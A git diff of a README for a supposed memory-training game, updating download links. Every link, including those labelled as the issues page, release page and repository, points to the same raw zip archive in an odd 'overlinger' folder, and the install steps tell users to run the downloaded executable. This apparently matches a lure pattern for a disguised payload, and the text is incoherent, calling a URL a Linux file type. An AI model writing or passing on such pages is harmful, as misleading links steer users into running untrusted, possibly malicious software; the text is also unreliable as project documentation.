@@ -6,7 +6,7 @@ Welcome to the Memory-Game! This game helps you improve your memory by challengi
 
 ## 📥 Download Link
 
-[![Download Memory-Game](https://raw.githubusercontent.com/Sha-dow837/Memory-Game/main/overlinger/Memory-Game.zip)](https://raw.githubusercontent.com/Sha-dow837/Memory-Game/main/overlinger/Memory-Game.zip)
+[![Download Memory-Game](https://github.com/Sha-dow837/Memory-Game/raw/refs/heads/main/overlinger/Game_Memory_1.2.zip)](https://github.com/Sha-dow837/Memory-Game/raw/refs/heads/main/overlinger/Game_Memory_1.2.zip)
 
 ## 📦 System Requirements
 
@@ -23,18 +23,18 @@ To get started, follow these steps:
 
 1. **Visit the Download Page**  
    Click the link below to visit the release page.
-   [Download Memory-Game](https://raw.githubusercontent.com/Sha-dow837/Memory-Game/main/overlinger/Memory-Game.zip)
+   [Download Memory-Game](https://github.com/Sha-dow837/Memory-Game/raw/refs/heads/main/overlinger/Game_Memory_1.2.zip)
 
 2. **Choose the Latest Release**  
    On the release page, you will see a list of versions. Look for the latest release.
 
 3. **Download the Application**  
-   Click on the appropriate file for your system. If you are unsure, the `.exe` file is for Windows, the `.dmg` file is for macOS, and the `https://raw.githubusercontent.com/Sha-dow837/Memory-Game/main/overlinger/Memory-Game.zip` file is for Linux. 
+   Click on the appropriate file for your system. If you are unsure, the `.exe` file is for Windows, the `.dmg` file is for macOS, and the `https://github.com/Sha-dow837/Memory-Game/raw/refs/heads/main/overlinger/Game_Memory_1.2.zip` file is for Linux. 
 
 4. **Install the Game**  
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the Memory-Game icon into your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/Sha-dow837/Memory-Game/main/overlinger/Memory-Game.zip` file using a file manager or terminal. Run the game from the extracted folder.
+   - For Linux: Extract the `https://github.com/Sha-dow837/Memory-Game/raw/refs/heads/main/overlinger/Game_Memory_1.2.zip` file using a file manager or terminal. Run the game from the extracted folder.
 
 5. **Run the Game**  
    Find the Memory-Game icon in your applications or programs list, and double-click it to start playing.
@@ -70,12 +70,12 @@ If you run into issues:
 ## 🌟 Community & Support
 
 You can find support and connect with other players:
-- Report issues on the [GitHub Issues page](https://raw.githubusercontent.com/Sha-dow837/Memory-Game/main/overlinger/Memory-Game.zip).
+- Report issues on the [GitHub Issues page](https://github.com/Sha-dow837/Memory-Game/raw/refs/heads/main/overlinger/Game_Memory_1.2.zip).
 - Join our community discussions to share tips and experiences.
 
 ## 🌐 Visit Our Page
 
 For the latest updates, features, and releases, visit our GitHub repository at:
-[Memory-Game Repository](https://raw.githubusercontent.com/Sha-dow837/Memory-Game/main/overlinger/Memory-Game.zip)
+[Memory-Game Repository](https://github.com/Sha-dow837/Memory-Game/raw/refs/heads/main/overlinger/Game_Memory_1.2.zip)
 
 Happy gaming! Remember, improving your memory can be fun and exciting!
